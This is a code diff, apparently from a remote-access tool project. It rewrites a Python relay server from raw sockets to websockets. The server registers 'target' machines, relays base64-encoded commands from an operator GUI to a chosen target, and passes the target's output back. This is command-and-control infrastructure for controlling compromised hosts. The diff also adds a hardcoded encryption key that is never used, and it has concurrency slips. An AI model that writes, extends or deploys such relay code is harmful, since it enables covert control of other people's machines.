@@ -1,81 +1,59 @@
-import socket, os, threading, base64
-from chave import enviar_msg, receber_msg
+import os, threading, base64, asyncio, websockets
+from cryptography.fernet import Fernet
 
-HOST = "0.0.0.0"
-PORTA = int(os.environ.get("PORT", 9001))
+CHAVE = b'RAlFuqD9uFroOFgpJUPE5zWG0WjGEfewa4_MTUe_2MM='
+FER = Fernet(CHAVE)
 
 alvos = {}
-gui_conn = None
+gui_ws = None
 lock = threading.Lock()
 prox_id = 1
 
-def log(m): print(f"[RELAY] {m}", flush=True)
-
-def enviar_gui(texto):
+async def enviar_gui(texto):
+    global gui_ws
     with lock:
-        if not gui_conn: return
-        try: enviar_msg(gui_conn, texto)
-        except: pass
+        if not gui_ws: return
+        try: await gui_ws.send(texto)
+        except: gui_ws = None
 
-def tratar_alvo(conn, addr, aid, info):
-    ip = addr[0]
-    with lock:
-        for ex in alvos.values():
-            if ex["ip"] == ip:
-                log(f"DUPLICATA {ip} — FECHANDO")
-                conn.close()
-                return
-        alvos[aid] = {"conn": conn, "ip": ip, "info": info}
+async def tratar_conexao(ws):
+    global gui_ws, prox_id
     try:
-        log(f"ALVO {aid} CONECTADO: {info}")
-        enviar_gui(f"NOVO_ALVO|{aid}|{ip}|{info}")
-        while True:
-            dados = receber_msg(conn, raw=True)
-            if not dados: break
-            enviar_gui(f"RESPOSTA|{aid}|{base64.b64encode(dados).decode()}")
+        prim = await ws.recv()
+        if prim == "SOU_GUI":
+            with lock: gui_ws = ws
+            print("[RELAY] GUI CONECTADA")
+            await ws.send("OK_GUI")
+            async for msg in ws:
+                if msg.startswith("CMD|"):
+                    _, aid_b, b64 = msg.split("|",2)
+                    aid = int(aid_b)
+                    dados = base64.b64decode(b64)
+                    with lock:
+                        if aid in alvos:
+                            await alvos[aid]["ws"].send(dados.decode())
+        else:
+            aid = prox_id
+            prox_id +=1
+            info = prim
+            ip = ws.remote_address[0]
+            with lock:
+                alvos[aid] = {"ws":ws,"ip":ip,"info":info}
+            print(f"[RELAY] ALVO {aid} CONECTADO: {info}")
+            await enviar_gui(f"NOVO_ALVO|{aid}|{ip}|{info}")
+            async for msg in ws:
+                await enviar_gui(f"RESPOSTA|{aid}|{base64.b64encode(msg.encode()).decode()}")
     finally:
-        with lock: alvos.pop(aid, None)
-        enviar_gui(f"SAIU_ALVO|{aid}")
-        conn.close()
+        if prim != "SOU_GUI":
+            with lock: alvos.pop(aid, None)
+            await enviar_gui(f"SAIU_ALVO|{aid}")
+            print(f"[RELAY] ALVO {aid} DESCONECTADO")
 
-def tratar_gui(conn, addr):
-    global gui_conn
-    with lock: gui_conn = conn
-    log("GUI CONECTADA")
-    enviar_msg(conn, "OK_GUI")
-    with lock:
-        for aid,d in alvos.items():
-            enviar_msg(conn, f"NOVO_ALVO|{aid}|{d['ip']}|{d['info']}")
-    while True:
-        txt = receber_msg(conn)
-        if not txt: break
-        if not txt.startswith("CMD|"): continue
-        _, aid_b, b64 = txt.split("|",2)
-        aid = int(aid_b)
-        dados = base64.b64decode(b64)
-        with lock:
-            if aid in alvos:
-                alvos[aid]["conn"].sendall(dados)
+async def main():
+    PORTA = int(os.environ.get("PORT", 9001))
+    async with websockets.serve(tratar_conexao, "0.0.0.0", PORTA):
+        print(f"[RELAY] WEBSOCKET NA PORTA {PORTA}")
+        await asyncio.Future()
 
-def main():
-    srv = socket.socket()
-    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
-    srv.bind((HOST,PORTA))
-    srv.listen(10)
-    log(f"OUVINDO NA {PORTA}")
-    while True:
-        conn, addr = srv.accept()
-        try:
-            conn.settimeout(3)
-            prim = receber_msg(conn)
-            conn.settimeout(None)
-            if prim == "SOU_GUI":
-                threading.Thread(target=tratar_gui,args=(conn,addr),daemon=True).start()
-            else:
-                global prox_id
-                aid = prox_id; prox_id +=1
-                threading.Thread(target=tratar_alvo,args=(conn,addr,aid,prim),daemon=True).start()
-        except:
-            conn.close()
-
-if __name__ == "__main__": main()
+if __name__ == "__main__":
+    asyncio.run(main())
